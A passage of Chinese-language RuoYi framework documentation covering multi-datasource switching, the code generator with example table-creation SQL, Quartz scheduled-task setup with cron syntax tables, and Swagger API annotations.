	<span class="token class-name">DynamicDataSourceContextHolder</span><span class="token punctuation">.</span><span class="token function">setDataSourceType</span><span class="token punctuation">(</span><span class="token class-name">DataSourceType</span><span class="token punctuation">.</span>SLAVE<span class="token punctuation">.</span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysUser</span><span class="token punctuation">&gt;</span></span> userList <span class="token operator">=</span> userMapper<span class="token punctuation">.</span><span class="token function">selectUserList</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">DynamicDataSourceContextHolder</span><span class="token punctuation">.</span><span class="token function">clearDataSourceType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> userList<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>逻辑实现代码 <code>com.ruoyi.framework.aspectj.DataSourceAspect</code></p>
<pre><code>注意：目前配置了一个从库，默认关闭状态。如果不需要多数据源不用做任何配置。 另外可新增多个从库。支持不同数据源（Mysql、Oracle、SQLServer）
</code></pre>
<p>提示</p>
<p>如果有<code>Service</code>方法内多个注解无效的情况使用内部方法调用<code>SpringUtils.getAopProxy(this).xxxxxx(xxxx)</code>;</p>
<h2><a id="_2799"></a>十六、代码生成</h2>
<p>大部分项目里其实有很多代码都是重复的，几乎每个基础模块的代码都有增删改查的功能，而这些功能都是大同小异， 如果这些功能都要自己去写，将会大大浪费我们的精力降低效率。所以这种重复性的代码可以使用代码生成。</p>
<h3><a id="1_2803"></a>1、默认配置</h3>
<p>单应用在<code>resources</code>目录下的<code>application.yml</code>，多模块<code>ruoyi-generator</code>中的<code>resources</code>目录下的<code>generator.yml</code>，可以自己根据实际情况调整默认配置。</p>
<pre><code class="prism language-yml"><span class="token comment"># 代码生成</span>
<span class="token key atrule">gen</span><span class="token punctuation">:</span> 
  <span class="token comment"># 开发者姓名，生成到类注释上</span>
  <span class="token key atrule">author</span><span class="token punctuation">:</span> ruoyi
  <span class="token comment"># 默认生成包路径 system 需改成自己的模块名称 如 system monitor tool</span>
  <span class="token key atrule">packageName</span><span class="token punctuation">:</span> com.ruoyi.system
  <span class="token comment"># 自动去除表前缀，默认是false</span>
  <span class="token key atrule">autoRemovePre</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>
  <span class="token comment"># 表前缀（生成类名不会包含表前缀，多个用逗号分隔）</span>
  <span class="token key atrule">tablePrefix</span><span class="token punctuation">:</span> sys_
</code></pre>
<h3><a id="2_2820"></a>2、单表结构</h3>
<p><strong>新建数据库表结构（单表）</strong></p>
<pre><code class="prism language-sql"><span class="token keyword">drop</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token keyword">exists</span> sys_student<span class="token punctuation">;</span>
<span class="token keyword">create</span> <span class="token keyword">table</span> sys_student <span class="token punctuation">(</span>
  student_id           <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>         <span class="token keyword">auto_increment</span>    <span class="token keyword">comment</span> <span class="token string">'编号'</span><span class="token punctuation">,</span>
  student_name         <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span>     <span class="token keyword">default</span> <span class="token string">''</span>        <span class="token keyword">comment</span> <span class="token string">'学生名称'</span><span class="token punctuation">,</span>
  student_age          <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>          <span class="token keyword">default</span> <span class="token boolean">null</span>      <span class="token keyword">comment</span> <span class="token string">'年龄'</span><span class="token punctuation">,</span>
  student_hobby        <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span>     <span class="token keyword">default</span> <span class="token string">''</span>        <span class="token keyword">comment</span> <span class="token string">'爱好（0代码 1音乐 2电影）'</span><span class="token punctuation">,</span>
  student_sex          <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>         <span class="token keyword">default</span> <span class="token string">'0'</span>       <span class="token keyword">comment</span> <span class="token string">'性别（0男 1女 2未知）'</span><span class="token punctuation">,</span>
  student_status       <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>         <span class="token keyword">default</span> <span class="token string">'0'</span>       <span class="token keyword">comment</span> <span class="token string">'状态（0正常 1停用）'</span><span class="token punctuation">,</span>
  student_birthday     <span class="token keyword">datetime</span>                          <span class="token keyword">comment</span> <span class="token string">'生日'</span><span class="token punctuation">,</span>
  <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token punctuation">(</span>student_id<span class="token punctuation">)</span>
<span class="token punctuation">)</span> <span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">innodb</span> <span class="token keyword">auto_increment</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">comment</span> <span class="token operator">=</span> <span class="token string">'学生信息表'</span><span class="token punctuation">;</span>
</code></pre>
<h3><a id="3_2840"></a>3、树表结构</h3>
<p><strong>新建数据库表结构（树表）</strong></p>
<pre><code class="prism language-sql"><span class="token keyword">drop</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token keyword">exists</span> sys_product<span class="token punctuation">;</span>
<span class="token keyword">create</span> <span class="token keyword">table</span> sys_product <span class="token punctuation">(</span>
  product_id        <span class="token keyword">bigint</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>      <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token keyword">auto_increment</span>    <span class="token keyword">comment</span> <span class="token string">'产品id'</span><span class="token punctuation">,</span>
  parent_id         <span class="token keyword">bigint</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>      <span class="token keyword">default</span> <span class="token number">0</span>                  <span class="token keyword">comment</span> <span class="token string">'父产品id'</span><span class="token punctuation">,</span>
  product_name      <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span>     <span class="token keyword">default</span> <span class="token string">''</span>                 <span class="token keyword">comment</span> <span class="token string">'产品名称'</span><span class="token punctuation">,</span>
  order_num         <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>          <span class="token keyword">default</span> <span class="token number">0</span>                  <span class="token keyword">comment</span> <span class="token string">'显示顺序'</span><span class="token punctuation">,</span>
  <span class="token keyword">status</span>            <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>         <span class="token keyword">default</span> <span class="token string">'0'</span>                <span class="token keyword">comment</span> <span class="token string">'产品状态（0正常 1停用）'</span><span class="token punctuation">,</span>
  <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token punctuation">(</span>product_id<span class="token punctuation">)</span>
<span class="token punctuation">)</span> <span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">innodb</span> <span class="token keyword">auto_increment</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">comment</span> <span class="token operator">=</span> <span class="token string">'产品表'</span><span class="token punctuation">;</span>
</code></pre>
<h3><a id="4_2858"></a>4、主子表结构</h3>
<p><strong>新建数据库表结构（主子表）</strong></p>
<pre><code class="prism language-sql"><span class="token comment">-- ----------------------------</span>
<span class="token comment">-- 客户表</span>
<span class="token comment">-- ----------------------------</span>
<span class="token keyword">drop</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token keyword">exists</span> sys_customer<span class="token punctuation">;</span>
<span class="token keyword">create</span> <span class="token keyword">table</span> sys_customer <span class="token punctuation">(</span>
  customer_id           <span class="token keyword">bigint</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>      <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token keyword">auto_increment</span>    <span class="token keyword">comment</span> <span class="token string">'客户id'</span><span class="token punctuation">,</span>
  customer_name         <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span>     <span class="token keyword">default</span> <span class="token string">''</span>                 <span class="token keyword">comment</span> <span class="token string">'客户姓名'</span><span class="token punctuation">,</span>
  phonenumber           <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>     <span class="token keyword">default</span> <span class="token string">''</span>                 <span class="token keyword">comment</span> <span class="token string">'手机号码'</span><span class="token punctuation">,</span>
  sex                   <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>     <span class="token keyword">default</span> <span class="token boolean">null</span>               <span class="token keyword">comment</span> <span class="token string">'客户性别'</span><span class="token punctuation">,</span>
  birthday              <span class="token keyword">datetime</span>                                   <span class="token keyword">comment</span> <span class="token string">'客户生日'</span><span class="token punctuation">,</span>
  remark                <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>    <span class="token keyword">default</span> <span class="token boolean">null</span>               <span class="token keyword">comment</span> <span class="token string">'客户描述'</span><span class="token punctuation">,</span>
  <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token punctuation">(</span>customer_id<span class="token punctuation">)</span>
<span class="token punctuation">)</span> <span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">innodb</span> <span class="token keyword">auto_increment</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">comment</span> <span class="token operator">=</span> <span class="token string">'客户表'</span><span class="token punctuation">;</span>


<span class="token comment">-- ----------------------------</span>
<span class="token comment">-- 商品表</span>
<span class="token comment">-- ----------------------------</span>
<span class="token keyword">drop</span> <span class="token keyword">table</span> <span class="token keyword">if</span> <span class="token keyword">exists</span> sys_goods<span class="token punctuation">;</span>
<span class="token keyword">create</span> <span class="token keyword">table</span> sys_goods <span class="token punctuation">(</span>
  goods_id           <span class="token keyword">bigint</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>      <span class="token operator">not</span> <span class="token boolean">null</span> <span class="token keyword">auto_increment</span>    <span class="token keyword">comment</span> <span class="token string">'商品id'</span><span class="token punctuation">,</span>
  customer_id        <span class="token keyword">bigint</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>      <span class="token operator">not</span> <span class="token boolean">null</span>                   <span class="token keyword">comment</span> <span class="token string">'客户id'</span><span class="token punctuation">,</span>
  name               <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span>     <span class="token keyword">default</span> <span class="token string">''</span>                 <span class="token keyword">comment</span> <span class="token string">'商品名称'</span><span class="token punctuation">,</span>
  weight             <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>          <span class="token keyword">default</span> <span class="token boolean">null</span>               <span class="token keyword">comment</span> <span class="token string">'商品重量'</span><span class="token punctuation">,</span>
  price              <span class="token keyword">decimal</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">default</span> <span class="token boolean">null</span>               <span class="token keyword">comment</span> <span class="token string">'商品价格'</span><span class="token punctuation">,</span>
  <span class="token keyword">date</span>               <span class="token keyword">datetime</span>                                   <span class="token keyword">comment</span> <span class="token string">'商品时间'</span><span class="token punctuation">,</span>
  <span class="token keyword">type</span>               <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>         <span class="token keyword">default</span> <span class="token boolean">null</span>               <span class="token keyword">comment</span> <span class="token string">'商品种类'</span><span class="token punctuation">,</span>
  <span class="token keyword">primary</span> <span class="token keyword">key</span> <span class="token punctuation">(</span>goods_id<span class="token punctuation">)</span>
<span class="token punctuation">)</span> <span class="token keyword">engine</span><span class="token operator">=</span><span class="token keyword">innodb</span> <span class="token keyword">auto_increment</span><span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">comment</span> <span class="token operator">=</span> <span class="token string">'商品表'</span><span class="token punctuation">;</span>
</code></pre>
<h3><a id="5_2894"></a>5、代码生成使用</h3>
<p>1、登录系统（系统工具 -&gt; 代码生成 -&gt; 导入对应表）</p>
<p>2、代码生成列表中找到需要表（可预览、编辑、同步、删除生成配置）</p>
<p>3、点击生成代码会得到一个<code>ruoyi.zip</code>执行<code>sql</code>文件，按照包内目录结构复制到自己的项目中即可</p>
<p>代码生成支持编辑、预览、同步</p>
<p>预览：对生成的代码提前预览，防止出现一些不符合预期的情况。</p>
<p>同步：对原表的字段进行同步，包括新增、删除、修改的字段处理。</p>
<p>修改：对生成的代码基本信息、字段信息、生成信息做一系列的调整。</p>
<p>另外多模块所有代码生成的相关业务逻辑代码在<code>ruoyi-generator</code>模块，不需要可以自行删除模块。</p>
<h2><a id="_2912"></a>十七、定时任务</h2>
<p>在实际项目开发中Web应用有一类不可缺少的，那就是定时任务。 定时任务的场景可以说非常广泛，比如某些视频网站，购买会员后，每天会给会员送成长值，每月会给会员送一些电影券； 比如在保证最终一致性的场景中，往往利用定时任务调度进行一些比对工作；比如一些定时需要生成的报表、邮件；比如一些需要定时清理数据的任务等。 所以我们提供方便友好的web界面，实现动态管理任务，可以达到动态控制定时任务启动、暂停、重启、删除、添加、修改等操作，极大地方便了开发过程。</p>
<p>提示</p>
<p>关于定时任务使用流程</p>
<p>1、后台添加定时任务处理类（支持<code>Bean</code>调用、<code>Class</code>类调用）<br/> <code>Bean</code>调用示例：需要添加对应<code>Bean</code>注解<code>@Component</code>或<code>@Service</code>。调用目标字符串：<code>ryTask.ryParams('ry')</code><br/> <code>Class</code>类调用示例：添加类和方法指定包即可。调用目标字符串：<code>com.ruoyi.quartz.task.RyTask.ryParams('ry')</code></p>
<pre><code class="prism language-java"><span class="token comment">/**
 * 定时任务调度测试
 * 
 * @author ruoyi
 */</span>
<span class="token annotation punctuation">@Component</span><span class="token punctuation">(</span><span class="token string">"ryTask"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">RyTask</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">ryMultipleParams</span><span class="token punctuation">(</span><span class="token class-name">String</span> s<span class="token punctuation">,</span> <span class="token class-name">Boolean</span> b<span class="token punctuation">,</span> <span class="token class-name">Long</span> l<span class="token punctuation">,</span> <span class="token class-name">Double</span> d<span class="token punctuation">,</span> <span class="token class-name">Integer</span> i<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"执行多参方法： 字符串类型{}，布尔类型{}，长整型{}，浮点型{}，整形{}"</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> b<span class="token punctuation">,</span> l<span class="token punctuation">,</span> d<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">ryParams</span><span class="token punctuation">(</span><span class="token class-name">String</span> params<span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行有参方法："</span> <span class="token operator">+</span> params<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">ryNoParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"执行无参方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>2、前端新建定时任务信息（系统监控 -&gt; 定时任务）<br/> 任务名称：自定义，如：定时查询任务状态<br/> 任务分组：根据字典<code>sys_job_group</code>配置<br/> 调用目标字符串：设置后台任务方法名称参数<br/> 执行表达式：可查询官方<code>cron</code>表达式介绍<br/> 执行策略：定时任务自定义执行策略<br/> 并发执行：是否需要多个任务间同时执行<br/> 状态：是否启动定时任务<br/> 备注：定时任务描述信息</p>
<p>3、点击执行一次，测试定时任务是否正常及调度日志是否正确记录，如正常执行表示任务配置成功。</p>
<p>执行策略详解：<br/> <code>立即执行</code>（所有<code>misfire</code>的任务会马上执行）打个比方，如果9点<code>misfire</code>了，在10：15系统恢复之后，9点，10点的<code>misfire</code>会马上执行<br/> <code>执行一次</code>（会合并部分的<code>misfire</code>，正常执行下一个周期的任务）假设9，10的任务都<code>misfire</code>了，系统在10：15分起来了。只会执行一次<code>misfire</code>，下次正点执行。<br/> <code>放弃执行</code>(所有的<code>misfire</code>不管，执行下一个周期的任务)</p>
<p>方法参数详解：<br/> <code>字符串</code>（需要单引号’'标识 如：<code>ryTask.ryParams(’ry’)</code>）<br/> <code>布尔类型</code>（需要true false标识 如：<code>ryTask.ryParams(true)</code>）<br/> <code>长整型</code>（需要L标识 如：<code>ryTask.ryParams(2000L)</code>）<br/> <code>浮点型</code>（需要D标识 如：<code>ryTask.ryParams(316.50D)</code>）<br/> <code>整型</code>（纯数字即可）</p>
<p>cron表达式语法:<br/> [秒] [分] [小时] [日] [月] [周] [年]</p>
<table><thead><tr><th>说明</th><th>必填</th><th>允许填写的值</th><th>允许的通配符</th></tr></thead><tbody><tr><td>秒</td><td>是</td><td>0-59</td><td>, - * /</td></tr><tr><td>分</td><td>是</td><td>0-59</td><td>, - * /</td></tr><tr><td>时</td><td>是</td><td>0-23</td><td>, - * /</td></tr><tr><td>日</td><td>是</td><td>1-31</td><td>, - * /</td></tr><tr><td>月</td><td>是</td><td>1-12 / JAN-DEC</td><td>, - * ? / L W</td></tr><tr><td>周</td><td>是</td><td>1-7 or SUN-SAT</td><td>, - * ? / L #</td></tr><tr><td>年</td><td>是</td><td>1970-2099</td><td>, - * /</td></tr></tbody></table>
<p>通配符说明:<br/> <code>*</code> 表示所有值。 例如:在分的字段上设置 *,表示每一分钟都会触发<br/> <code>?</code> 表示不指定值。使用的场景为不需要关心当前设置这个字段的值。例如:要在每月的10号触发一个操作，但不关心是周几，所以需要周位置的那个字段设置为”?” 具体设置为 0 0 0 10 * ?<br/> <code>-</code> 表示区间。例如 在小时上设置 “10-12”,表示 10,11,12点都会触发<br/> <code>,</code> 表示指定多个值，例如在周字段上设置 “MON,WED,FRI” 表示周一，周三和周五触发<br/> <code>/</code> 用于递增触发。如在秒上面设置”5/15” 表示从5秒开始，每增15秒触发(5,20,35,50)。 在月字段上设置’1/3’所示每月1号开始，每隔三天触发一次<br/> <code>L</code> 表示最后的意思。在日字段设置上，表示当月的最后一天(依据当前月份，如果是二月还会依据是否是润年[leap]), 在周字段上表示星期六，相当于”7”或”SAT”。如果在”L”前加上数字，则表示该数据的最后一个。例如在周字段上设置”6L”这样的格式,则表示“本月最后一个星期五”<br/> <code>W</code> 表示离指定日期的最近那个工作日(周一至周五). 例如在日字段上置”15W”，表示离每月15号最近的那个工作日触发。如果15号正好是周六，则找最近的周五(14号)触发, 如果15号是周未，则找最近的下周一(16号)触发.如果15号正好在工作日(周一至周五)，则就在该天触发。如果指定格式为 “1W”,它则表示每月1号往后最近的工作日触发。如果1号正是周六，则将在3号下周一触发。(注，”W”前只能设置具体的数字,不允许区间”-“)<br/> <code>#</code> 序号(表示每月的第几个周几)，例如在周字段上设置”6#3”表示在每月的第三个周六.注意如果指定”#5”,正好第五周没有周六，则不会触发该配置(用在母亲节和父亲节再合适不过了) ；小提示：’L’和 ‘W’可以一组合使用。如果在日字段上设置”LW”,则表示在本月的最后一个工作日触发；周字段的设置，若使用英文字母是不区分大小写的，即MON与mon相同</p>
<p>常用表达式例子:</p>
<table><thead><tr><th>表达式</th><th>说明</th></tr></thead><tbody><tr><td>0 0 2 1 * ? *</td><td>表示在每月的1日的凌晨2点调整任务</td></tr><tr><td>0 15 10 ? * MON-FRI</td><td>表示周一到周五每天上午10:15执行作业</td></tr><tr><td>0 15 10 ? 6L 2002-2006</td><td>表示2002-2006年的每个月的最后一个星期五上午10:15执行作</td></tr><tr><td>0 0 10,14,16 * * ?</td><td>每天上午10点，下午2点，4点</td></tr><tr><td>0 0/30 9-17 * * ?</td><td>朝九晚五工作时间内每半小时</td></tr><tr><td>0 0 12 ? * WED</td><td>表示每个星期三中午12点</td></tr><tr><td>0 0 12 * * ?</td><td>每天中午12点触发</td></tr><tr><td>0 15 10 ? * *</td><td>每天上午10:15触发</td></tr><tr><td>0 15 10 * * ?</td><td>每天上午10:15触发</td></tr><tr><td>0 15 10 * * ? *</td><td>每天上午10:15触发</td></tr><tr><td>0 15 10 * * ? 2005</td><td>2005年的每天上午10:15触发</td></tr><tr><td>0 * 14 * * ?</td><td>在每天下午2点到下午2:59期间的每1分钟触发</td></tr><tr><td>0 0/5 14 * * ?</td><td>在每天下午2点到下午2:55期间的每5分钟触发</td></tr><tr><td>0 0/5 14,18 * * ?</td><td>在每天下午2点到2:55期间和下午6点到6:55期间的每5分钟触发</td></tr><tr><td>0 0-5 14 * * ?</td><td>在每天下午2点到下午2:05期间的每1分钟触发</td></tr><tr><td>0 10,44 14 ? 3 WED</td><td>每年三月的星期三的下午2:10和2:44触发</td></tr><tr><td>0 15 10 ? * MON-FRI</td><td>周一至周五的上午10:15触发</td></tr><tr><td>0 15 10 15 * ?</td><td>每月15日上午10:15触发</td></tr><tr><td>0 15 10 L * ?</td><td>每月最后一日的上午10:15触发</td></tr><tr><td>0 15 10 ? * 6L</td><td>每月的最后一个星期五上午10:15触发</td></tr><tr><td>0 15 10 ? * 6L 2002-2005</td><td>2002年至2005年的每月的最后一个星期五上午10:15触发</td></tr><tr><td>0 15 10 ? * 6#3</td><td>每月的第三个星期五上午10:15触发</td></tr></tbody></table>
<p>多模块所有定时任务的相关业务逻辑代码在<code>ruoyi-quartz</code>模块，可以自行调整或剔除</p>
<pre><code>注意：不同数据源定时任务都有对应脚本，Oracle、Mysql已经有了，其他的可自行下载执行
</code></pre>
<h2><a id="_3030"></a>十八、系统接口</h2>
<p>在现在的开发过程中还有很大一部分公司都是以口口相传的方式来进行前后端的联调，而接口文档很大一部分都只停留在了说说而已的地步，或者写了代码再写文档。 还有一点就是文档的修改，定义好的接口并不是一成不变的，可能在开发过程中文档修改不止一次的变化，这个时候就会很难受了。 只要不是强制性要求，没人会愿意写这东西，而且在写的过程中，一个字母的错误就会导致联调时候的很大麻烦，但是通过<code>Swagger</code>，我们可以省略了这一步，而且文档出错率近乎于零， 只要你在写代码的时候，稍加几个注解，文档自动生成。</p>
<p>1、在控制层<code>Controller</code>中添加注解来描述接口信息如:</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Api</span><span class="token punctuation">(</span><span class="token string">"参数配置"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@Controller</span>
<span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/system/config"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConfigController</span>
</code></pre>
<p>2、在方法中配置接口的标题信息</p>
<pre><code class="prism language-sql"><span class="token variable">@ApiOperation</span><span class="token punctuation">(</span><span class="token string">"查询参数列表"</span><span class="token punctuation">)</span>
<span class="token variable">@ResponseBody</span>
<span class="token keyword">public</span> TableDataInfo list<span class="token punctuation">(</span>Config config<span class="token punctuation">)</span>
{
	startPage<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	List<span class="token operator">&lt;</span>Config<span class="token operator">&gt;</span> list <span class="token operator">=</span> configService<span class="token punctuation">.</span>selectConfigList<span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> getDataTable<span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>
}
</code></pre>
<p>3、在<code>系统工具-系统接口</code>测试相关接口</p>
<pre><code>注意：SwaggerConfig可以指定根据注解或者包名扫描具体的API
</code></pre>
<p>API详细说明</p>
<table><thead><tr><th>作用范围</th><th>API</th><th>使用位置</th></tr></thead><tbody><tr><td>协议集描述</td><td>@Api</td><td>用于controller类上</td></tr><tr><td>对象属性</td><td>@ApiModelProperty</td><td>用在出入参数对象的字段上</td></tr><tr><td>协议描述</td><td>@ApiOperation</td><td>用在controller的方法上</td></tr><tr><td>Response集</td><td>@ApiResponses</td><td>用在controller的方法上</td></tr><tr><td>Response</td><td>@ApiResponse</td><td>用在 @ApiResponses里边</td></tr><tr><td>非对象参数集</td><td>@ApiImplicitParams</td><td>用在controller的方法上</td></tr><tr><td>非对象参数描述</td><td>@ApiImplicitParam</td><td>用在@ApiImplicitParams的方法里边</td></tr><tr><td>描述返回对象的意义</td><td>@ApiModel</td><td>用在返回对象类上</td></tr></tbody></table>
<p><code>api</code>标记，用在类上，说明该类的作用。可以标记一个<code>Controller</code>类做为<code>Swagger</code>文档资源，使用方式：</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Api</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/user"</span><span class="token punctuation">,</span> description <span class="token operator">=</span> <span class="token string">"用户管理"</span><span class="token punctuation">)</span>
</code></pre>
<p>与<code>Controller</code>注解并列使用。 属性配置：</p>
<table><thead><tr><th>属性名称</th><th>备注</th></tr></thead><tbody><tr><td>value</td><td>url的路径值</td></tr><tr><td>tags</td><td>如果设置这个值、value的值会被覆盖</td></tr><tr><td>description</td><td>对api资源的描述</td></tr><tr><td>basePath</td><td>基本路径可以不配置</td></tr><tr><td>position</td><td>如果配置多个Api 想改变显示的顺序位置</td></tr><tr><td>produces</td><td>For example, “application/json, application/xml”</td></tr><tr><td>consumes</td><td>For example, “application/json, application/xml”</td></tr><tr><td>protocols</td><td>Possible values: http, https, ws, wss.</td></tr><tr><td>authorizations</td><td>高级特性认证时配置</td></tr><tr><td>hidden</td><td>配置为true 将在文档中隐藏</td></tr></tbody></table>
<p><code>ApiOperation</code>标记，用在方法上，说明方法的作用，每一个<code>url</code>资源的定义,使用方式：</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@ApiOperation</span><span class="token punctuation">(</span><span class="token string">"获取用户信息"</span><span class="token punctuation">)</span>
</code></pre>
<p>与<code>Controller</code>中的方法并列使用，属性配置：</p>
<table><thead><tr><th>属性名称</th><th>备注</th></tr></thead><tbody><tr><td>value</td><td>url的路径值</td></tr><tr><td>tags</td><td>如果设置这个值、value的值会被覆盖</td></tr><tr><td>description</td><td>对api资源的描述</td></tr><tr><td>basePath</td><td>基本路径可以不配置</td></tr><tr><td>position</td><td>如果配置多个Api 想改变显示的顺序位置</td></tr><tr><td>produces</td><td>For example, “application/json, application/xml”</td></tr><tr><td>consumes</td><td>For example, “application/json, application/xml”</td></tr><tr><td>protocols</td><td>Possible values: http, https, ws, wss.</td></tr><tr><td>authorizations</td><td>高级特性认证时配置</td></tr><tr><td>hidden</td><td>配置为true将在文档中隐藏</td></tr><tr><td>response</td><td>返回的对象</td></tr><tr><td>responseContainer</td><td>这些对象是有效的 “List”, “Set” or “Map”.，其他无效</td></tr><tr><td>httpMethod</td><td>“GET”, “HEAD”, “POST”, “PUT”, “DELETE”, “OPTIONS” and “PATCH”</td></tr><tr><td>code</td><td>http的状态码 默认 200</td></tr><tr><td>extensions</td><td>扩展属性</td></tr></tbody></table>
<p><code>ApiParam</code>标记，请求属性，使用方式：</p>
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token class-name">TableDataInfo</span> <span class="token function">list</span><span class="token punctuation">(</span><span class="token annotation punctuation">@ApiParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"查询用户列表"</span><span class="token punctuation">,</span> required <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token class-name">User</span> user<span class="token punctuation">)</span>
</code></pre>
<p>与Controller中的方法并列使用，属性配置：</p>
<table><thead><tr><th>属性名称</th><th>备注</th></tr></thead><tbody><tr><td>name</td><td>属性名称</td></tr><tr><td>value</td><td>属性值</td></tr><tr><td>defaultValue</td><td>默认属性值</td></tr><tr><td>allowableValues</td><td>可以不配置</td></tr><tr><td>required</td><td>是否属性必填</td></tr><tr><td>access</td><td>不过多描述</td></tr><tr><td>allowMultiple</td><td>默认为false</td></tr><tr><td>hidden</td><td>隐藏该属性</td></tr><tr><td>example</td><td>举例子</td></tr></tbody></table>
<p><code>ApiResponse</code>标记，响应配置，使用方式：</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@ApiResponse</span><span class="token punctuation">(</span>code <span class="token operator">=</span> <span class="token number">400</span><span class="token punctuation">,</span> message <span class="token operator">=</span> <span class="token string">"查询用户失败"</span><span class="token punctuation">)</span>
</code></pre>
<p>与<code>Controller</code>中的方法并列使用，属性配置：</p>
<table><thead><tr><th>属性名称</th><th>备注</th></tr></thead><tbody><tr><td>code</td><td>http的状态码</td></tr><tr><td>message</td><td>描述</td></tr><tr><td>response</td><td>默认响应类 Void</td></tr><tr><td>reference</td><td>参考ApiOperation中配置</td></tr><tr><td>responseHeaders</td><td>参考 ResponseHeader 属性配置说明</td></tr><tr><td>responseContainer</td><td>参考ApiOperation中配置</td></tr></tbody></table>
<p><code>ApiResponses</code>标记，响应集配置，使用方式:</p>
